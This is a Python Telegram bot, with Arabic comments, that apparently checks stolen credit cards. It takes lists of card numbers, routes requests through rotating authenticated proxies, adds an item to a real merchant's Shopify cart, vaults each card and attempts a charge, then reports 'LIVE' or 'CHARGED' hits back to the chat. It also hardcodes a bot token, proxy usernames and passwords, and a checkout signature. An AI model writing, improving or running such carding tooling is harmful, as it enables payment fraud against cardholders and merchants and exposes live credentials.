import requests
import re
import time
import telebot

# --- إعدادات البوت والبروكسي ---
API_TOKEN = '8558756991:AAE2p49el5WET5c0M2q7qA07_J6DRLG5jP4' # احصل عليه من @BotFather
bot = telebot.TeleBot(API_TOKEN)

# قائمة البروكسيات (سيتم التبديل بينها تلقائياً لكل طلب)
PROXIES_LIST = [
    "http://iEN2jEvl:5TqD95Nm664K@proxy.taquito.pp.ua:8080",
    "http://purevpn0s13928422:e3wWSKKfCg09ah@px990502.pointtoserver.com:10780"
]

class ShopifyCheckerBot:
    def __init__(self, domain="onetreeplanted.org", variant_id="19213139542078"):
        self.domain = domain
        self.variant_id = variant_id
        self.ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"

    def check(self, card, proxy):
        session = requests.Session()
        # دمج البروكسي في الجلسة
        session.proxies = {"http": proxy, "https": proxy}
        
        try:
            n, mm, yy, cvc = card.replace(" ", "").split('|')
            yy_short = yy[-2:] if len(yy.strip()) >= 2 else yy.strip()
            
            # 1. تهيئة الجلسة
            session.post(f"https://{self.domain}/cart/add.js", data={'id': self.variant_id, 'quantity': '1'})
            res = session.post(f"https://{self.domain}/cart", data={'checkout': ''}, allow_redirects=True)
            ii = re.search(r'/checkouts/(?:cn/)?([^/?]+)', res.url).group(1) if '/checkouts/' in res.url else None
            
            if not ii: return "❌ SESSION ERROR"

            # 2. Vaulting
            sig = "eyJraWQiOiJ2MSIsImFsZyI6IkhTMjU2In0.eyJjbGllbnRfaWQiOiIyIiwiY2xpZW50X2FjY291bnRfaWQiOiIzMjY3MTg5IiwidW5pcXVlX2lkIjoiZGEyMmFlODFmZTFlZWIzNDJiOWU3MjE1MTNjMjI2NDIiLCJpYXQiOjE3NzYwOTM5NzN9.9x7Cq9p5uwe2ZYD9IeuDyOOyGK-n5atmnH6ieBLdM3s"
            v_data = {"credit_card": {"number": n, "month": int(mm), "year": int(yy_short), "verification_value": cvc, "name": "Mustafa Najm"}, "payment_session_scope": self.domain}
            v_res = session.post('https://checkout.pci.shopifyinc.com/sessions', json=v_data, headers={'shopify-identification-signature': sig})
            v_id = v_res.json().get('id')
            
            if not v_id: return "❌ VAULT FAILED"

            # 3. Charge Attempt
            pay_url = f"https://{self.domain}/checkouts/cn/{ii}"
            session.patch(pay_url, 
                json={"checkout": {"payment_gateway_id": "3267189", "credit_card": {"vault_token": v_id}}},
                headers={'X-Requested-With': 'XMLHttpRequest', 'Accept': 'application/json'}
            )

            time.sleep(6)
            final_res = session.get(pay_url, allow_redirects=True)
            page = final_res.text.lower()
            
            if "thank_you" in final_res.url or "success" in page:
                return "✅ CHARGED SUCCESS"
            
            if any(msg in page for msg in ["insufficient", "not enough funds", "limit exceeded"]):
                return "⚠️ LOW FUNDS (LIVE)"
            
            if any(msg in page for msg in ["declined", "failed", "error", "invalid"]):
                error_msg = re.search(r'class="notice__text">([^<]+)', final_res.text)
                return f"❌ DEAD - {error_msg.group(1) if error_msg else 'Declined'}"

            return "⚠️ UNKNOWN"
        except:
            return "❌ PROXY/CONNECTION ERROR"

checker = ShopifyCheckerBot()

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "أهلاً مصطفى! أرسل الكومبو للفحص (Card|Month|Year|CVC)")

@bot.message_handler(content_types=['document', 'text'])
def handle_combo(message):
    if message.content_type == 'text':
        combo = message.text.split('\n')
    else:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        combo = downloaded_file.decode('utf-8').split('\n')

    bot.reply_to(message, f"🚀 بدأ الفحص لـ {len(combo)} فيزا...")

    proxy_index = 0
    for card in combo:
        if not card.strip(): continue
        
        # تبديل البروكسي لكل عملية فحص
        current_proxy = PROXIES_LIST[proxy_index % len(PROXIES_LIST)]
        proxy_index += 1
        
        result = checker.check(card.strip(), current_proxy)
        
        # إرسال النتائج الـ Live فقط للبوت لتقليل الإزعاج
        if "LIVE" in result or "CHARGED" in result:
            msg = f"✨ **HIT FOUND!**\n💳 Card: `{card.strip()}`\n📊 Status: {result}\n🌐 Proxy: Rotating"
            bot.send_message(message.chat.id, msg, parse_mode="Markdown")
        
        # تأخير بسيط لتجنب الحظر
        time.sleep(1)

bot.polling()
